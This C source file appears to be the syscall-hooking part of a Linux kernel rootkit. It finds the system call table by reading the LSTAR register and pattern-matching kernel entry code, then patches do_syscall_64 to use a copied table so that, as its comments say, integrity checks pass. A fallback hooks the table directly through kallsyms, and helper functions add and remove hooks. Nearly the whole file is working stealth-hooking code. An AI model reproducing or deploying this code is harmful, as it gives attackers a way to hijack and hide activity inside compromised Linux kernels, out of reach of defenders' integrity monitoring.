#include <linux/kallsyms.h>

#include "syscall_hooking.h"
#include "helper.h"

static enum MODE { DISABLED, ENABLED, ENABLED_MSR } mode;

static unsigned long orig_sys_call_table = 0;
static unsigned char *sys_call_table_ref_addr = NULL;
static unsigned long *sys_call_table_copy[NR_syscalls] = {0};

/*
 * The primarily approach is to redirect the system calls
 * to a copy of the syscall table. In this way, the original
 * syscall table is not modified and integrity checks on the
 * syscall table will pass. To detect this kind of hooking,
 * function integrity checking of the syscall entry functions,
 * such as do_syscall64 and entry_SYSCALL_64 / entry_SYSCALL_64_trampoline
 * is required.
 *
 * We do this by pattern matching of the assembly constructions.
 */
int do_msr_hooking(void) {

    // some pointers to functions that are called during the SYSCALL procedure
    unsigned long entry_SYSCALL_64_trampoline;
    unsigned long entry_SYSCALL_64 = 0;
    unsigned long entry_SYSCALL_64_stage2 = 0;
    unsigned long entry_SYSCALL_64_hwframe;
    unsigned long do_syscall_64;
    unsigned long start_for_do_syscall_64;

    unsigned char *code;
    unsigned int offset, evil_sys_call_table;
    int i, rip = 0;

    /*
     * Check if copied sys_call_table is 32-bit addressable, else this mechanism would fail
     */
    if ((((unsigned long) sys_call_table_copy & 0xffffffff00000000) >> 32) != 0xffffffff) {
        return -1;
    }

    /*
     * Assume that the trampoline is enabled. (This was introduced to overcome meltdown attacks)
     * When LSTAR references to entry_SYSCALL_64_trampoline instead of entry_SYSCALL_64 directly, we have
     * to find the jump sequence to the actual entry_SYSCALL_64 function. The calling order is as follows:
     *
     * entry_SYSCALL_64_trampoline -> entry_SYSCALL_64_stage2 -> entry_SYSCALL_64_hwframe
     *
     * We need the __entry_SYSCALL_64_trampoline address from the LSTAR MSR register
     */
    rdmsrl(MSR_LSTAR, entry_SYSCALL_64_trampoline);


    /*
     * We then have to find the entry_SYSCALL_64_stage2 within this function by pattern matching
     */
    code = (unsigned char *) entry_SYSCALL_64_trampoline;
    for (i = 0; i < 256; i++) {
        if (code[i] == 0x48 && code[i+7] == 0xe8) {
            entry_SYSCALL_64_stage2 = 0xffffffff00000000 | *((unsigned int*)(code + i + 3));
            break;
        }
    }

    if (!entry_SYSCALL_64_stage2) {

        /*
         * Pattern matching failed. Try the same with assuming that LSTAR references to entry_SYSCALL_64
         */
        entry_SYSCALL_64 = entry_SYSCALL_64_trampoline;
        goto try_entry_SYSCALL_64;
    }

    /*
     * Get the relative jmp offset to entry_SYSCALL_64_hwframe
     */
    code = (unsigned char *) entry_SYSCALL_64_stage2;
    if (code[0] != 0x5f || code[1] != 0xeb) {
        // not found
        return -1;
    }

    /*
     * The entry_SYSCALL_64_hwframe is relative to the entry_SYSCALL_64_stage2 at the
     * address after the jmp instruction. Since in x86 jmp is relative to the instruction after the jmp,
     * we have to add the value 0x3
     */
    entry_SYSCALL_64_hwframe = code[2] + 0x3 + entry_SYSCALL_64_stage2;

    /*
     * entry_SYSCALL_64_hwframe is a label within entry_SYSCALL_64, so the following code is the
     * same for the case where LSTAR points to entry_SYSCALL_64 directly
     */

try_entry_SYSCALL_64:

    /*
     * Now lets find the do_syscall_64 call by pattern matching
     */
    start_for_do_syscall_64 = entry_SYSCALL_64 == 0 ? entry_SYSCALL_64_hwframe : entry_SYSCALL_64;
    code = (unsigned char *) start_for_do_syscall_64;
    for (i = 0; i < 256; i++) {
        if (code[i] == 0x48 && code[i+3] == 0xe8) {
            offset = *((unsigned int*)(code + i + 4));

            /*
             * We have to subtract the relative offset for x86 call instructions, which can be calculated as follows
             * + code[i + 8] should be the instruction after the call
             * + code[0] is relative to entry_SYSCALL_64_hwframe / entry_SYSCALL_64
             */
            rip = i + 8 + start_for_do_syscall_64;
            break;
        }
    }

    if (!rip) {
        // not found
        return -1;
    }

    /*
     * Now we have the offset of the E8 call to do_syscall_64 in offset, and the current address in rip
     * To get the absolute do_syscall_64 address, we have to add the signed-int-interpreted offset to rip
     * https://stackoverflow.com/questions/10376787/need-help-understanding-e8-asm-call-instruction-x86
     */
    do_syscall_64 = rip + (int) offset;

    /*
     * Find the syscall table and its reference in the do_syscall_64 code
     * TODO How stable is this? We do pattern matching on compiled C code,
     * TODO which might be different for different compiler versions
     */
    code = (unsigned char *) do_syscall_64;
    for (i = 0; i < 256; i++) {
        // 48 8b 04 c5 find this instruction for "mov rax,QWORD PTR [rax*8-0x....]"
        if (code[i] == 0x48 && code[i+1] == 0x8b && code[i+2] == 0x04 && code[i+3] == 0xc5) {
            orig_sys_call_table = 0xffffffff00000000 | *((unsigned int*)(code + i + 4));
            sys_call_table_ref_addr = code + i + 4;
            break;
        }
    }

    if (!sys_call_table_ref_addr) {
        // not found
        return -1;
    }

    /*
     * Now we have the syscall table, let's create a copy and replace the orig one by the copy
     */
    memcpy(sys_call_table_copy, (unsigned long *) orig_sys_call_table, sizeof(unsigned long) * NR_syscalls);
    evil_sys_call_table = (unsigned int) (((unsigned long) sys_call_table_copy) & 0xFFFFFFFF);

    unprotect_paging_mode();
    memcpy(sys_call_table_ref_addr, &evil_sys_call_table, 4);
    protect_paging_mode();

    mode = ENABLED_MSR;
    return 0;
}

/*
 * The alternative approach is to access the sys_call_table via kallsyms
 * and directly hook the syscall table entries. This approach is less stealthy.
 */
int do_syscall_hooking(void) {

    /*
     * Get the address of the sys_call_table from kallsyms
     */
    if (0 == (orig_sys_call_table = kallsyms_lookup_name("sys_call_table"))) {
        return -1;
    }

    /*
     * Store the original values in the copy to allow unhooking
     */
    memcpy(sys_call_table_copy, (unsigned long *) orig_sys_call_table, sizeof(unsigned long) * NR_syscalls);

    mode = ENABLED;
    return 0;
}

int enable_syscall_hooking(void) {

    switch (mode) {
        case DISABLED:
            if (0 != do_msr_hooking()) {
                return do_syscall_hooking();
            }
            return 0;
        default:
            // already enabled
            return -1;
    }
}

void disable_syscall_hooking(void) {
    unsigned int orig;
    unsigned int i;

    switch (mode) {
        case DISABLED:
            return;
        case ENABLED:
            unprotect_paging_mode();
            for (i = 0; i < NR_syscalls; i++) {
                ((unsigned long *) orig_sys_call_table)[i] = (unsigned long) sys_call_table_copy[i];
            }
            protect_paging_mode();

            break;
        case ENABLED_MSR:

            /*
             * Get the sys_call_table address in 32 bit
             */
            orig = (unsigned int) orig_sys_call_table & 0xFFFFFFFF;

            /*
             * Restore reference to original sys_call_table in do_syscall_64
             */
            unprotect_paging_mode();
            memcpy(sys_call_table_ref_addr, &orig, 4);
            protect_paging_mode();

            orig_sys_call_table = 0;
            sys_call_table_ref_addr = NULL;
            break;
    }
    mode = DISABLED;
}

int add_syscall_hook(unsigned long nr, unsigned long *hook_addr) {

    if (nr >= NR_syscalls) {
        return -1;
    }

    switch (mode) {
        case DISABLED:
            return -1;
        case ENABLED:
            unprotect_paging_mode();
            ((unsigned long *) orig_sys_call_table)[nr] = (unsigned long) hook_addr;
            protect_paging_mode();
            break;
        case ENABLED_MSR:
            sys_call_table_copy[nr] = hook_addr;
            break;
    }
    return 0;
}

int rm_syscall_hook(unsigned long nr) {

    unsigned long *orig;

    if (nr >= NR_syscalls) {
        return -1;
    }

    switch (mode) {
        case DISABLED:
            return -1;
        case ENABLED:
            unprotect_paging_mode();
            ((unsigned long *) orig_sys_call_table)[nr] = (unsigned long) sys_call_table_copy[nr];
            protect_paging_mode();
            break;
        case ENABLED_MSR:
            orig = (unsigned long *) orig_sys_call_table;
            sys_call_table_copy[nr] = (unsigned long *) orig[nr];
            break;
    }

    return 0;
}

unsigned long get_original_syscall(unsigned long nr) {

    if (nr >= NR_syscalls) {
        return 0;
    }

    switch (mode) {
        case DISABLED:
            break;
        case ENABLED:
            return (unsigned long) sys_call_table_copy[nr];
        case ENABLED_MSR:
            return ((unsigned long *) orig_sys_call_table)[nr];
    }

    return 0;
}
